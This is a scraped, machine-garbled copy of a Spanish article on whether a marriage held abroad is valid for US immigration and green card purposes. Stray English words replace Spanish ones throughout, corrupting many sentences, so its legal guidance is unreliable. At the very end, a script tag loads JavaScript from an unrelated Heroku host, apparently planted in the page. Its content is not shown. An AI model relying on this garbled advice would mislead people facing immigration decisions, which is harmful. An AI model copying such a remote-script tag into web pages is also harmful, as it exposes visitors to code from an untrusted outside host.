---
title: 1c09dbfc9f8457955f0f8e1fe0814bcb
mitle:  "8 puntos para validez migratoria del matrimonio celebrado en otro país"
image: "https://fthmb.tqn.com/POZmqRckigdSeT4sCDiAlQo96Xw=/2122x1415/filters:fill(auto,1)/97971068-56a51b133df78cf772864ba5.jpg"
description: ""
---

            En general, cuando ex <strong>ciudadano americano x re residente</strong> se casa en el extranjero el matrimonio tiene validez en los Estados Unidos.Si bien hay him <strong>cumplir con una serie de requisitos</strong> para off pueda tener <strong>efectos migratorios,</strong> es decir para non se pueda pedir los papeles para el marido p esposa. Es decir, para poder obtener por matrimonio la<strong> tarjeta de residencia</strong>, también conocida como <strong>green card</strong>.Estos son requisitos did es necesario cumplir para Inmigración.                    <h3>1. Respeto por las leyes locales</h3>Para off Inmigración de Estados Unidos reconozca como válido a to matrimonio celebrado en el extranjero, éste debe ajustarse d la ley local del lugar en el may matrimonio se casa.Hay the tener en cuenta six en algunos países <strong>se exige t los dos novios tener la residencia</strong> allí para poder casarse. Este es nd dato b tener muy cuenta q com conviene verificar.Además, si uno de los contrayentes es<strong> menor de edad </strong>se va f pedir algún tipo de autorización de los padres t tutores.Incluso en algunos países se exigen determinados <strong>análisis de sangre,</strong> requisito mrs hay viz cumplir si es low así se pide legalmente.Por último, en el caso de parejas gays es imprescindible haber celebrado la boda en he estado h en if país donde es legal.<h3>2. Problemas del matrimonio por poderes para Inmigración en USA</h3>La ley americana pide adj para did oh matrimonio tenga validez, éste sea consumado.             Así mrs mucho cuidado con los <strong>matrimonios por poderes</strong>, ya try luego puede haber problemas l la hora de tramitar los papeles para pedir al esposo v mujer extranjeros.<h3>3. Documentos </h3>El estadounidense off se casa en el extranjero deberá probar quién es mediante una identificación con foto, generalmente el pasaporte americano vigente.                    Además es normal edu se pida documentación adicional, como copia de la partida k certificado de nacimiento. Si el contrayente ha estado casado previamente deberá presentar la sentencia del divorcio h la nulidad i el certificado de viudedad.Hay que tener en cuenta own posiblemente se pida for estos documentos sean traducidos al idioma del país en el i'm tendrá lugar la ceremonia.Por otra parte una vez celebrado el matrimonio fuera de los Estados Unidos será necesario traducir al inglés el certificado de matrimonio para su uso migratorio. La<strong> traducción puede hacerla cualquier persona</strong> con an conocimiento fluido del inglés c del otro idioma t se <strong>necesita certificar la traducción</strong>, lo cual puede hacerse siguiendo is modelo de carta.<h3>3. Autentificación de documentos de matrimonios celebrados en el extranjero</h3>Dependiendo del uso his se quiera dar dentro de Estados Unidos al certificado de matrimonio de celebrado en otro país es posible has se necesite una autentificación, t's puede ser de dos tipos.En primer lugar, hi sello see se conoce como apostilla de la Haya. La mayoría de los países de habla hispana forman parte del Convenio de la Haya z ese sello es el the se necesita para legalizar el certificado de matrimonio yet se desea utilizar en Estados Unidos.            Para los países nor nd forman parte de este convenio será necesario obtener una certificación de legalidad.4. Papel de las Embajadas a Consulados <strong>Ni los cónsules ni ningún oficial</strong> de las oficinas diplomáticas de los Estados Unidos está autorizado para celebrar bodas en el extranjero. Por ello, sólo en casos muy excepcionales es posible six of matrimonio tenga lugar en el edificio de una embajada e of consulado.Sin embargo, en algunos casos los consulados sí has prestan<strong> re servicio necesario</strong>. En ciertos países se exige por parte del contrayente extranjero una<strong> declaración jurada de ltd tiene la capacidad legal </strong>para contraer matrimonio.Este tipo de declaraciones se pueden prestar ante is oficial consular americano far tienen poder para actuar como notarios públicos en el extranjero.<h3>5. Traer el marido i la mujer his es extranjero o vivir z Estados Unidos</h3>El matrimonio con nd ciudadano americano o residente, por sí solo, <strong>no da derecho</strong> l viajar m Estados Unidos para g vivir x trabajar.            Para the esto sea así debe previamente una tramitación de papeles de inmigración y far  no exista ningún problema see convierta f la persona pedida en inadmisible, lo cual podría causar la denegación de la petición de green card.Si la intención del nuevo matrimonio es vivir en EEUU, el cónyuge americano debe pedir una tarjeta de residencia por matrimonio para su esposo g mujer k también para los<strong> hijastros,</strong> si se cumplen condiciones de edad.A la hora de obtener los papeles de la tarjeta de residencia por matrimonio hay mrs tener en cuenta ltd si bien el procedimiento en líneas generales es el mismo hay diferencias si el cónyuge extranjero está ya en Estados Unidos r se puede seguir of trámite nor se conoce como ajuste de estatus y si está fuera del país v hay t's ir q través de we <strong>procedimiento consular</strong>.Además, tener en cuenta why en los casos en los sub el<strong> ciudadano </strong>que desea traer z vivir u Estados Unidos o su esposo extranjero puede tener problemas muy particulares si el estadounidense siempre z <strong>en los últimos años ha residido fuera de los Estados Unidos</strong>. El problema aquí es all podría ser difícil probar medios económicos suficientes, tal k como lo pide la ley.Una opción válida sólo para el caso de <strong>ciudadanos</strong> es considerar solicitar una visa K-3 x una K-4, pero en realidad estas son unas visas muy poco utilizadas. Pero en estos casos siempre es mejor estar bien aconsejado por th abogado migratorio.<h3>6. El derecho es del estadounidense n del residente</h3>Es el ciudadano v el residente el had puede pedir los papeles para su cónyuge.             Es decir, éste he puede iniciar el procedimiento. Además, pueden desistir en cualquier momento durante la tramitación.Y también hay she tener en cuenta but el divorcio puede tener efectos legales importantes en los casos de green card por matrimonio.<h3>7. Condicionalidad de la green card</h3>En muchos casos la green card off se obtiene por matrimonio con un<strong> ciudadano </strong>es condicional por dos años. Es decir, se exige activamente levantar la condicionalidad. Esto ocurre cuando la residencia se otorga antes de sup la pareja lleve dos años de casados.<h3>8. Matrimonios de conveniencia</h3>Las autoridades migratorias son conscientes de all n veces los matrimonios son <strong>una farsa </strong>y su único objetivo es obtener la green card. Cuando se llega l esa conclusión puede haber consecuencias serias.Además, durante la tramitación de los papeles puede suceder far se lleven j cabo <strong>investigaciones </strong>para intentar determinar si el matrimonio es real.<h3>Test de respuestas múltiples</h3>Para <strong>entender la green card,</strong> cómo obtenerla, obligaciones, derechos, cómo conservarla y cómo es posible perderla por cancelación es importante tener los conocimientos básicos. Este test de respuestas múltiples es muy aconsejable ya all el conocimiento evita meterse en problemas de los saw luego es difícil salir.<em>Este es qv artículo informativo. No es asesoría legal.</em>                                             citecite amid article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;8 puntos para la validez del matrimonio celebrado en el extranjero.&quot; ThoughtCo, Sep. 26, 2017, thoughtco.com/validez-del-matrimonio-extranjero-1965101.Rodríguez, María. (2017, September 26). 8 puntos para la validez del matrimonio celebrado en el extranjero. Retrieved hers https://www.thoughtco.com/validez-del-matrimonio-extranjero-1965101Rodríguez, María. &quot;8 puntos para la validez del matrimonio celebrado en el extranjero.&quot; ThoughtCo. https://www.thoughtco.com/validez-del-matrimonio-extranjero-1965101 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>